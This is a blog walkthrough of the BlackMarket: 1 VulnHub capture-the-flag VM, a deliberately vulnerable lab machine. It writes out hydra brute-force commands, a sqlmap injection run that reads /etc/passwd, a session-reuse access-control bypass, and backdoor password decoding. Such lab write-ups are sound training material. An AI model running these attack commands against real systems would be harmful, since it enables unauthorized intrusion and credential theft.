@@ -1,0 +1,336 @@
+
+
+Overt, Covert, and Clandestine
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+17 Jun 2018
+
+
+
+12 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of BlackMarket: 1, a boot2root VM created by AcEb0mb3R, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+The BlackMarket VM was first presented at Brisbane SecTalks BNE0x1B. This VM has a total of six flags and one root flag. Each flag leads to another and the flag format is flag{blahblah}.
+Information Gathering
+Letâs start with a nmap scan to establish the available services in the host.
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
+...
+PORT    STATE SERVICE    REASON         VERSION
+21/tcp  open  ftp        syn-ack ttl 64 vsftpd 3.0.2
+22/tcp  open  ssh        syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 a9:98:84:aa:90:7e:f1:e6:be:c0:84:3e:fa:aa:83:8a (DSA)
+|   2048 07:5c:77:15:30:5a:17:95:8e:0f:91:f0:2d:0b:c3:7a (RSA)
+|   256 2f:9c:29:b5:f5:dc:f4:95:07:6d:41:ee:f9:0d:15:b8 (ECDSA)
+|_  256 24:ac:30:c7:79:7f:43:cc:fc:23:df:ea:db:bb:4a:cc (ED25519)
+80/tcp  open  http       syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: BlackMarket Weapon Management System
+110/tcp open  pop3?      syn-ack ttl 64
+|_ssl-date: TLS randomness does not represent time
+143/tcp open  imap       syn-ack ttl 64 Dovecot imapd
+|_ssl-date: TLS randomness does not represent time
+993/tcp open  ssl/imap   syn-ack ttl 64 Dovecot imapd
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Issuer: commonName=localhost/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-11-01T07:05:35
+| Not valid after:  2027-11-01T07:05:35
+| MD5:   beb8 4ed5 6adc dc0e d595 6678 2039 473e
+|_SHA-1: 94b8 f1b8 913e a32b 4ea1 6e58 4252 8a7c c432 c897
+|_ssl-date: TLS randomness does not represent time
+995/tcp open  ssl/pop3s? syn-ack ttl 64
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Issuer: commonName=localhost/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-11-01T07:05:35
+| Not valid after:  2027-11-01T07:05:35
+| MD5:   beb8 4ed5 6adc dc0e d595 6678 2039 473e
+|_SHA-1: 94b8 f1b8 913e a32b 4ea1 6e58 4252 8a7c c432 c897
+|_ssl-date: TLS randomness does not represent time
+
+nmap finds plenty of open services. But, letâs continue our efforts with http since there is a higher chance of finding an attack surface here.
+Flag: 1
+Indeed, the first flag is in the HTML source of the landing page at http://192.168.10.130/.
+
+I thought the flagâs body looked like itâs base64 encoded. This is what I get after decoding it.
+# echo -n Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU= | base64 -d &amp;&amp; echo
+CIA - Operation Treadstone
+
+Hmm. CIA? Operation Treadstone? Jason Bourne?
+Following the trail of the first flag, I google for âCIA - Operation Treadstoneâ and build a wordlist with cewl from the first resultâit might be useful later.
+Hereâs how.
+# cewl -w cewl.txt http://bourne.wikia.com/wiki/Operation_Treadstone
+
+Directory Fuzzing
+Next, I use dirbuster with one of the bigger wordlists to fuzz the siteâto uncover any directories that are not visible from the get-go.
+Dir found: / - 200
+Dir found: /admin/ - 302
+Dir found: /css/ - 403
+Dir found: /db/ - 403
+Dir found: /dist/ - 403
+Dir found: /dist/css/ - 403
+Dir found: /dist/js/ - 403
+Dir found: /icons/ - 403
+Dir found: /server-status/ - 403
+Dir found: /squirrelmail/ - 302
+Dir found: /supplier/ - 302
+Dir found: /upload/ - 403
+Dir found: /user/ - 302
+Dir found: /vendor/ - 403
+
+The fuzz turns up /squirrelmail and /uploadâpotential attack surfaces. Files like /header.php and /navbar are also consistently seen (return code 200) under /admin, /supplier, and /user, which suggests that the site could be using role-based access.
+BlackMarket Login
+This is how the login page looks like.
+
+Letâs use hydra to perform a brute-force login attack on the site and see if we can pick any low-hanging fruit. usernames.txt contains admin, supplier and user, and top10.txt contains the top-ten passwords found in the dark web.
+# hydra -L usernames.txt -P top10.txt -f -e nsr -o hydra.txt -t 64 192.168.10.130 http-post-form "/login.php:username=^USER^&amp;password=^PASS^:failed"
+[80][http-post-form] host: 192.168.10.130   login: supplier   password: supplier
+
+Boom. Iâm in. And as you can see, what is in top10.txt is unimportant because the password is the same as the username.
+
+SQL Injection
+I know that Iâm looking at a potential SQL injection vulnerability when it involves product ID in a table of products.
+
+The tool for the job is sqlmap. Iâll need the session cookie to scan for SQLi vulnerabilities. Hereâs how to get the session cookie from the browserâs cookie manager.
+
+Next, letâs run the cookie through sqlmap.
+sqlmap --cookie="PHPSESSID=og152rg2j9k54tll52l146g9j4" --url=http://192.168.10.130/supplier/edit_product.php?id=1
+
+
+Awesome. Letâs proceed to determine the databases and dump out interesting information from them.
+Five databases in MySQL.
+
+Ten tables in BlackMarket.
+
+Five users in user table.
+
+Hereâs /etc/passwd that I read off with --file-read command option.
+root:x:0:0:root:/root:/bin/bash
+...
+dimitri:x:1000:1000:,,,:/home/dimitri:/bin/bash
+jbourne:x:1001:1001::/var/www/html/jbourne:
+nicky:x:1002:1002:,,,:/home/nicky:/bin/ftponly
+ftp:x:112:120:ftp daemon,,,:/srv/ftp:/bin/false
+
+Flag: 2
+Notice that the way for nicky to log in is through ftp? I know that ftp is available from the nmap scan. Armed with this information, letâs give a shot to hydra and the wordlist I built earlier on, and try to brute-force our way in.
+# hydra -l nicky -P cewl.txt -f -o hydra.txt -e nsr -t 64 ftp://192.168.10.130)
+[21][ftp] host: 192.168.10.130   login: nicky   password: CIA
+
+The second flag is in the file IMP.txt. You can find the file at /ftp/ImpFiles after logging in.
+# cat IMP.txt
+flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}
+
+If anyone reading this message it means you are on the right track however I do not have any idea about the CIA blackmarket Vehical workshop. You must find out and hack it!
+
+Itâs decoded to this.
+# echo -n Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy | base64 -d
+Congrats Proceed Further
+
+Letâs proceed further then.
+Flag: 3
+The third flag is in the flag tableâone of the tables in BlackMarket database.
+
+Iâm supposed to find the email access of Jason Bourne; and we know from the results of the dirbuster fuzz that /squirrelmail existsâa web-based email client.
+
+Flag: 4
+Recall the supplier login access? Because of poor coding in the role-based access, I can point the URL to a different role such as /admin and access their respective landing pages with supplierâs session cookie.
+
+Besides changing to the landing pages of other roles with the same session cookie, I can also change the login password of any user as long as I know the user ID. Letâs change the password of admin (id=1) through /edit_customer.php using Burp Repeater.
+
+Iâve changed adminâs password to admin. The fourth flag is on display once Iâm logged in.
+
+Itâs decoded to this.
+# echo -n bm90aGluZyBpcyBoZXJl | base64 -d &amp;&amp; echo
+nothing is here
+
+Trolledâthe decoded message says ânothing is hereâ.
+Flag: 5
+Since thereâs a tendency of trolling, could ????? be the password to Jason Bourne email access?
+
+Sure enough, I got in with the credential (jbourne:?????).
+Looking into INBOX.Drafts lies the fifth flag and an encrypted message from [email protected] No prize for guessing who that is 
+
+Itâs decoded to this.
+# echo -n RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ= | base64 -d &amp;&amp; echo
+Everything is encrypted
+
+Duh. The decoded flag offers nothing of value.
+Decryption
+Itâs obvious that we are looking at some kind of substitution cipher. The method to decipher itâis to look for words with repeated characters. For example, straight up we have âWrnrgirâ, which is a substitution for âDimitriâ. As such, the first line is âHi Dimitriâ.
+Moving on to the word âzxxvhhâ, which has two pairs of repeated charactersâwe can turn to regular expression and a dictionary to help us find the next substitution candidate.
+# grep -P '^[a-z]([a-z])\1[a-z]([a-z])\2$' /usr/share/dict/words
+abbess
+access
+appall
+assess
+bootee
+hoodoo
+muumuu
+peewee
+teepee
+voodoo
+
+The substitution candidate is possibly âaccessâ as the other words donât make contextual sense in the message.
+As I piece together the substitution candidates and the contextual clues, I come to realize the substitution key is the reverse alphabet set. I wrote a simple bash script to decrypt the whole message.
+decrypy.sh
+#!/bin/bash
+
+SET1=$((echo -n {a..z}; echo -n {A..Z}) | tr -d ' ')
+SET2=$((echo -n {z..a}; echo -n {Z..A}) | tr -d ' ')
+
+cat $1 | tr $SET1 $SET2
+
+Letâs decrypt the message.
+# ./decrypt.sh encrypted.txt
+Hi Dimitri
+If you are reading this I might be not alive. I have place a backdoor in Blackmarket
+workshop under /kgbbackdoor folder you must have to use
+PassPass.jpg in order to get access.
+
+BlackMarket Auto Workshop
+Hmm. Another web application? I got a 404 - Not Found when I navigated to /eworkshop following the trail.
+Not knowing how to proceed, I use the following command hoping that Iâll be lucky enough to locate the web application by switching out the letter before workshop with all the alphabetical letters.
+# for c in {a..z}; do printf "/${c}workshop/: %d\n" $(curl -s -w %{http_code} -o /dev/null 192.168.10.130/${c}workshop/); done
+/aworkshop/: 404
+/bworkshop/: 404
+/cworkshop/: 404
+/dworkshop/: 404
+/eworkshop/: 404
+/fworkshop/: 404
+/gworkshop/: 404
+/hworkshop/: 404
+/iworkshop/: 404
+/jworkshop/: 404
+/kworkshop/: 404
+/lworkshop/: 404
+/mworkshop/: 404
+/nworkshop/: 404
+/oworkshop/: 404
+/pworkshop/: 404
+/qworkshop/: 404
+/rworkshop/: 404
+/sworkshop/: 404
+/tworkshop/: 404
+/uworkshop/: 404
+/vworkshop/: 200
+/wworkshop/: 404
+/xworkshop/: 404
+/yworkshop/: 404
+/zworkshop/: 404
+
+The web application is at /vworkshop. Wait a minute! Didnât the second flag mention Vehical workshop? I got trolled again.
+
+KGB Backdoor
+From the decrypted message, we got to know that a backdoor is in the BlackMarket Auto Workshop and that we need PassPass.jpg to gain access to it. Hereâs how PassPass.jpg looks like.
+
+Like they always sayâthe devil is in the detail.
+# strings PassPass.jpg | tail -1
+Pass = 5215565757312090656
+
+Backdoor Login
+This time round, I rely on good olâ fashion guesswork to determine the location of the backdoor. Itâs at /vworkshop/kgbbackdoor/backdoor.php.
+
+From the HTML source of the page, itâs obvious that to access the backdoor, I need to submit a POST request with password. To that end, I wrote a simple HTML login form.
+index.html
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;style&gt;
+      body {
+        width: 300px;
+        height: 100px;
+        margin: 0 auto;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 100px;
+      }
+    &lt;/style&gt;
+    &lt;title&gt;Backdoor Login&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;div class="login"&gt;
+      &lt;h2&gt;Come on, let's do this!&lt;/h2&gt;
+      &lt;form action="http://192.168.10.130/vworkshop/kgbbackdoor/backdoor.php" method="post"&gt;
+        &lt;input name="pass" type="password" /&gt;
+        &lt;button type="submit"&gt;Login&lt;/button&gt;
+      &lt;/form&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+And â¦ 5215565757312090656 is not the passwordâtoo bad.
+
+This prompts me to look deeper into 5215565757312090656. Notice that it has nineteen digits, an odd numberâthereâs no way this is hexadecimal; itâs an integer.
+Next, I convert the integer into hexadecimal and print it out as ASCII.
+# printf "%x\n" 5215565757312090656 | xxd -p -r
+HailKGB
+
+This is more like it.
+
+Boom. Iâm in.
+Flag: 6
+The sixth flag is at the home directory of the backdoor.
+
+Itâs decoded to this.
+# echo -n Um9vdCB0aW1l | base64 -d &amp;&amp; echo
+Root time
+
+I must be getting close.
+Dimitri Hates Apple
+I get itâDimitri hates Apple products.
+
+Having gone so far into this challenge, Iâm pretty sure this is the password for dimitriâs account. In fact, I got in without realizing that I typed DimitriHateApple instead DimitryHateApple. What a stroke of luck!
+
+Root Time
+My lucky streak continuesâdimitri is able to sudo as root.
+
+Time to be root and call it a day.
+
+
+Decoded Flags
+1. CIA - Operation Treadstone
+2. Congrats Proceed Further
+3. Find Jason Bourne Email access
+4. nothing is here
+5. Everything is encrypted
+6. Root time
+
+
